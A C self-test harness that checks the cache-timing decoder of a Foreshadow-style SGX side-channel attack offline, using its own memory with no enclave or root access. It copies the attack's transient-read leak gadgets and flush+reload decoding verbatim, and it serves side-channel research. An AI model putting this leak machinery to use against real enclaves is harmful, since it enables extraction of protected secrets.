/*
 * GGSEC modifications and additions:
 * Copyright (C) 2026 Maciej Gojny, GG Advanced IT Security UG
 */
/*
 *  Offline decoder self-test for the split lo/hi oracle used by
 *  foreshadow-ssa-warm.c -- NO SGX, NO enclave, NO AEX, NO root.
 *
 *  Purpose: settle whether the r15 failure (class 0x15 -> low6 = 21) is an
 *  oracle-geometry / dead-slot bug in the decoder itself, or an SGX-path
 *  artifact (set-21 eviction by the #PF/sigreturn handler working set).
 *
 *  It reproduces the exact decode path (same SLOT_SIZE, same leak_lo/leak_hi
 *  gadget, same set_of, the same conservative `+20` decode_trace_warm) on
 *  attacker-owned present memory. The victim byte is placed at the SAME page
 *  offsets the real GPRSGX frame occupies (0xf48, 0xf80, 0xfc0 -> c* = 61/62/63)
 *  so the excluded-class geometry matches the live run bit for bit; the oracles
 *  are page-aligned exactly like the real ones (base_set = 0). The only thing
 *  removed is the transient/#PF path: here the movb reads present memory
 *  architecturally (the leaktest.c stand-in), which gives a STRONGER signal than
 *  the transient read -- so any value that fails here is a decoder/oracle bug,
 *  not an SGX artifact.
 *
 *  Discriminator:
 *    - class 21 (values 0x15/0x55/0x95/0xd5) FAILS here  -> oracle-geometry bug
 *      (fix in the decoder: XOR-key permutation / abstention).
 *    - class 21 PASSES here but fails under AEX          -> set-21 eviction by
 *      the handler path (fix: relocate oracle/handler stack off set 21).
 *
 *  ORACLE_LO_OFF (same env as foreshadow-ssa-warm): shift the lo-oracle base.
 *  Architectural 256/256 must still hold at the shifted geometry; class 21's
 *  slot set becomes (base_set+21) mod 64. This is the offline half of Phase 0.
 *
 *  Build (on .86, no root):
 *    gcc -O2 -I$HOME/sgx-step selftest-decode.c -o selftest-decode
 *  Run:
 *    ./selftest-decode            # 200 votes/value (default)
 *    VOTES=400 ./selftest-decode
 *    ORACLE_LO_OFF=0x400 ./selftest-decode
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sched.h>
#include <sys/mman.h>

#include "libsgxstep/cache.h"    /* flush(), reload() -- the exact primitives */

#define SLOT_SIZE   0x1040
#define LO_CLASSES  64
#define HI_CLASSES  4

/* page-aligned exactly like the real oracles -> base_set = 0 at off 0.
 * +0x400 headroom matches foreshadow-ssa-warm.c (ORACLE_LO_OFF=0x400). */
char __attribute__((aligned(0x1000))) oracle_lo[SLOT_SIZE * LO_CLASSES + 0x400];
char __attribute__((aligned(0x1000))) oracle_hi[SLOT_SIZE * HI_CLASSES];
static char *oracle_lo_base;
static unsigned oracle_lo_off = 0;

static void *volatile skip_to = NULL;   /* set by the gadget; unused offline (no fault) */

/* ---- verbatim from foreshadow-ssa-warm.c ---- */
static inline void leak_lo(void *base, void *adrs)
{
    asm volatile(
        "   lea 2f(%%rip), %%rax\n\t   mov %%rax, %0\n\t"
        "1: movb (%1), %%al\n\t   movzbl %%al, %%eax\n\t   and $0x3f, %%eax\n\t"
        "   imul %3, %%rax\n\t   movq (%2, %%rax), %%rdi\n\t 2:\n\t"
        : "=m"(skip_to) : "r"(adrs), "r"(base), "r"((unsigned long) SLOT_SIZE)
        : "rax", "rdi", "memory");
}
static inline void leak_hi(void *base, void *adrs)
{
    asm volatile(
        "   lea 2f(%%rip), %%rax\n\t   mov %%rax, %0\n\t"
        "1: movb (%1), %%al\n\t   movzbl %%al, %%eax\n\t   shr $6, %%eax\n\t"
        "   imul %3, %%rax\n\t   movq (%2, %%rax), %%rdi\n\t 2:\n\t"
        : "=m"(skip_to) : "r"(adrs), "r"(base), "r"((unsigned long) SLOT_SIZE)
        : "rax", "rdi", "memory");
}

static inline int set_of(void *p) { return (int)(((uint64_t) p >> 6) & 63); }

static int decode_trace_warm(void *base, int classes, int hi, void *adrs)
{
    int c, best = -1, excl = -1;
    uint64_t t, b = ~0UL, excl_t = ~0UL;
    int ssa_set = set_of(adrs);

    for (c = 0; c < classes; c++)
        flush((char *) base + (uint64_t) c * SLOT_SIZE);
    if (hi) leak_hi(base, adrs); else leak_lo(base, adrs);
    for (c = 0; c < classes; c++)
    {
        char *slot = (char *) base + (uint64_t) c * SLOT_SIZE;
        t = reload(slot);
        if (set_of(slot) == ssa_set) { excl = c; excl_t = t; continue; }
        if (t < b) { b = t; best = c; }
    }
    if (excl >= 0 && excl_t + 20 < b) best = excl;
    return best;
}
/* ---- end verbatim ---- */

static int votes_lo[LO_CLASSES];
static int votes_hi[HI_CLASSES];

static int decode_value(volatile unsigned char *victim, int v, int votes)
{
    int r, k, lo = 0, hi = 0;
    memset(votes_lo, 0, sizeof(votes_lo));
    memset(votes_hi, 0, sizeof(votes_hi));
    *victim = (unsigned char) v;
    for (r = 0; r < votes; r++)
    {
        int cl = decode_trace_warm(oracle_lo_base, LO_CLASSES, 0, (void *) victim);
        int ch = decode_trace_warm(oracle_hi, HI_CLASSES, 1, (void *) victim);
        if (cl >= 0) votes_lo[cl & 0x3f]++;
        if (ch >= 0) votes_hi[ch & 3]++;
    }
    for (k = 1; k < LO_CLASSES; k++) if (votes_lo[k] > votes_lo[lo]) lo = k;
    for (k = 1; k < HI_CLASSES; k++) if (votes_hi[k] > votes_hi[hi]) hi = k;
    return ((hi & 3) << 6) | (lo & 0x3f);
}

int main(void)
{
    int votes = getenv("VOTES") ? atoi(getenv("VOTES")) : 200;
    if (votes < 1) votes = 1;

    oracle_lo_base = oracle_lo;
    {
        const char *off_s = getenv("ORACLE_LO_OFF");
        if (off_s && *off_s)
        {
            oracle_lo_off = (unsigned) strtoul(off_s, NULL, 0);
            if (oracle_lo_off & 63U)
            {
                fprintf(stderr, "ORACLE_LO_OFF=0x%x not line-aligned; using 0\n",
                        oracle_lo_off);
                oracle_lo_off = 0;
            }
            else if ((unsigned long) oracle_lo_off
                     + (unsigned long) SLOT_SIZE * LO_CLASSES > sizeof(oracle_lo))
            {
                fprintf(stderr, "ORACLE_LO_OFF=0x%x exceeds buffer; using 0\n",
                        oracle_lo_off);
                oracle_lo_off = 0;
            }
            oracle_lo_base = oracle_lo + oracle_lo_off;
        }
    }

    /* pin to the victim core for stable timing (non-root) */
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(1, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) CPU_SET(0, &set);

    /* one page; victim bytes placed at the real GPRSGX page offsets */
    unsigned char *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) { perror("mmap"); return 1; }

    struct { const char *name; int off; } groups[] = {
        { "A", 0xf48 }, { "B", 0xf80 }, { "C", 0xfc0 },
    };

    printf("offline decoder self-test: votes/value=%d, oracle_lo off=0x%x "
           "base_set=%d (class 21 -> set %d)\n",
           votes, oracle_lo_off, set_of(oracle_lo_base),
           (set_of(oracle_lo_base) + 21) & 63);

    for (int g = 0; g < 3; g++)
    {
        volatile unsigned char *victim = page + groups[g].off;
        int cstar = set_of((void *) victim);
        int fails = 0, first_fail = -1;

        for (int v = 0; v < 256; v++)
        {
            int rec = decode_value(victim, v, votes);
            if (rec != v)
            {
                if (first_fail < 0) first_fail = v;
                if (fails < 12)
                    printf("  [FAIL] group %s off=0x%x c*=%d  v=0x%02x (lo=%d) "
                           "-> 0x%02x (lo=%d)\n",
                           groups[g].name, groups[g].off, cstar,
                           v, v & 0x3f, rec, rec & 0x3f);
                fails++;
            }
        }
        printf("group %s (off 0x%x, c*=%d): %d/256 correct, %d fail\n",
               groups[g].name, groups[g].off, cstar, 256 - fails, fails);
    }

    /* raw lo-latency vector for the r15 case: value 0x15 (class 21) in group C */
    {
        volatile unsigned char *victim = page + 0xfc0;
        double avg[LO_CLASSES]; int c;
        for (c = 0; c < LO_CLASSES; c++) avg[c] = 0.0;
        *victim = 0x15;
        for (int r = 0; r < votes; r++)
        {
            for (c = 0; c < LO_CLASSES; c++)
                flush(oracle_lo_base + (uint64_t) c * SLOT_SIZE);
            leak_lo(oracle_lo_base, (void *) victim);
            for (c = 0; c < LO_CLASSES; c++)
                avg[c] += (double) reload(oracle_lo_base + (uint64_t) c * SLOT_SIZE);
        }
        printf("\nraw lo-latency for v=0x15 (true class 21, slot set %d), "
               "group C c*=63, avg over %d:\n",
               (set_of(oracle_lo_base) + 21) & 63, votes);
        for (c = 0; c < LO_CLASSES; c++)
        {
            printf(" c%02d=%4.0f%s", c, avg[c] / votes,
                   (c == 21 ? "<21" : c == 63 ? "<c*" : ""));
            if ((c & 7) == 7) printf("\n");
        }
    }

    munmap(page, 0x1000);
    return 0;
}
